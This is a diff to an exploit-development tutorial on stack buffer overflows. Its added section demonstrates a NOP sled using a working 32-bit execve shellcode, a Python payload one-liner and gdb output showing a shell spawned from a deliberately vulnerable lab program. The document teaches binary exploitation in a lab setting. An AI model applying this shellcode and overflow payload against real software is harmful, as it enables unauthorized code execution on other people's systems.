@@ -85,7 +85,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Segmentation fault is nothing because you can see that the gdb shows you detaching. It means that the shell is executed.
 
-Now, do it with `pwntools`:
+Do it with `pwntools`:
 ```python
 from pwn import *
 
@@ -226,7 +226,7 @@ Shellcode:
   int 0x80
 ```
 
-Now, you need to extract opcodes:
+You need to extract opcodes:
 ```bash
 # Assemble the file
 nasm -f elf32 dirty-low-level-shellcode.asm
@@ -261,7 +261,7 @@ Disassembly of section .text:
   16:	cd 80                	int    0x80
 ```
 
-You got the shellcode. Now, you need to test it.
+You got the shellcode. Next, you need to test it.
 
 ```C
 #include <stdio.h>
@@ -320,7 +320,7 @@ So, clean shellcode will be the following:
 
 ### Use the shellcode to exploit the vulnerability
 
-Now, we have a completed shellcode, let's use it. But first, recompile the program with the parameters: `gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie -z execstack -m32` to make stack executable.
+We have a completed shellcode, let's use it. But first, recompile the program with the parameters: `gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie -z execstack -m32` to make stack executable.
 
 Crash the program and find the address of the buffer within the stack:
 ```bash
@@ -349,9 +349,9 @@ gef➤
 
 So, my address is `0xffffcea6`. Then, I just placed the shellcode at the beginning of the buffer and jumped on it. You can see gdb said that the new program was executed.
 
-Now, try it outside gdb. It doesn't work. gdb creates its own address space and there is an offset between the address in gdb and the real address of the executable.
+Try it outside gdb. It doesn't work. gdb creates its own address space and there is an offset between the address in gdb and the real address of the executable.
 
-Gdb has its env variables. So, we unset them with `unset environment`.
+Gdb has its env variables. So, we unset them with `unset environment`. '`LINES` and `COLUMNS` vars are the lines and columns of the terminal, and GDB sets them internally'.
 
 ```bash
 gef➤  unset environment LINES
@@ -377,4 +377,46 @@ process 8791 is executing new program: /bin/dash
 [Inferior 1 (process 8791) exited normally]
 ```
 
-Now, it works again inside gdb. Sometimes it helps, sometimes doesn't. You could try to brute-force it with some sort of script, but there is a better solution. And that's why we need the next subsection of stack overflow vulnerability.
+It works again inside gdb. Sometimes it helps, sometimes doesn't. You could try to brute-force it with some sort of script, but there is a better solution. And that's why we need the next subsection of stack overflow vulnerability.
+
+## NOP chain
+
+At this moment, you already have a working shellcode, you know the offset, and so on. But you need somehow figure out the address of the shellcode in the stack. Nop sled or chain will help you.
+
+NOP is an instruction that does nothing and it means NO-OPERATION. So, you can guess that simply placing this instruction at the beginning of the shellcode will help you to easily exploit the vulnerability.
+
+Let's try it:
+
+```bash
+gef➤  r < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')
+
+Breakpoint 1, 0x08049242 in vuln_func ()
+```
+
+```bash
+gef➤  x/50wx $esp - 0x140
+0xffffceac:	0xf7fa8580	0xffffcfe8	0xf7fe7b24	0xffffcee6
+0xffffcebc:	0x0804c000	0xf7fa8000	0xf7fa8000	0xffffcfe8
+0xffffcecc:	0x0804923a	0xffffcee6	0xffffcf20	0x00000003
+0xffffcedc:	0x08049224	0xf7ffd000	0x9090e76c	0x90909090
+0xffffceec:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcefc:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf0c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf1c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf2c:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffcf3c:	0x90909090	0x90909090	0x90909090	0xc0319090
+0xffffcf4c:	0x2f2f6850	0x2f686873	0x896e6962	0x895350e3
+0xffffcf5c:	0xcd0bb0e1	0x41414180	0x41414141	0x41414141
+0xffffcf6c:	0x41414141	0x41414141
+gef➤  r < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\x1c\xcf\xff\xff"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\x1c\xcf\xff\xff"')
+
+Breakpoint 1, 0x08049242 in vuln_func ()
+
+gef➤  c
+Continuing.
+process 10186 is executing new program: /bin/dash
+```
+
+Now, you see the exploit works too with the NOP chain.
